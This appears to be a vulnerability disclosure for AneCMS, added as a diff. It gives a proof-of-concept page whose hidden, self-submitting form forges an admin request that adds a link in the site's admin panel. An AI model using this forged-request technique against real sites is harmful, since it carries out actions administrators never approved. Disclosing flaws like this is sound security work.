@@ -1,0 +1,72 @@
+                                =======================================================================
+   
+                                                    AneCMS CSRF Vulnerability
+ 
+                                =======================================================================
+   
+                                                               by
+   
+                                                         Pratul Agrawal
+ 
+   
+   
+  # Vulnerability found in- Admin module
+   
+  # email         Pratulag@yahoo.com
+   
+  # company       aksitservices
+   
+  # Credit by     Pratul Agrawal
+ 
+  # Software      Ane_CMS
+
+  # Category  	  CMS / Portals
+  
+  # Plateform     php
+  
+   
+   
+  #  Proof of concept   #
+ 
+  Targeted URL:  http://server/acp/index.php?p=cfg&m=links
+  
+ 
+   Script to Add a new link through Cross Site request forgery
+   
+             .  ................................................................................................................
+   
+                        <html>
+
+                          <body>
+
+                             <form name="XYZ" action="http://server/acp/index.php?p=cfg&m=links&id=0" method="post">
+
+                                    <input type=hidden name="name" value="master">
+
+                                    <input type=hidden name="link" value="master.asp">
+
+                                    <input type=hidden name="type" value="1">
+              
+                                    <input type=hidden name="view" value="0">
+
+                             </form>
+
+                               <script>
+
+                                 document.XYZ.submit();
+
+                               </script>
+
+                          </body>
+
+                        </html>
+   
+             .  ..................................................................................................................
+   
+   
+   
+  After execution refresh the page and u can see that a new link with teh given name is Added automatically.
+  
+  
+  #If you have any questions, comments, or concerns, feel free to contact me.
+                    
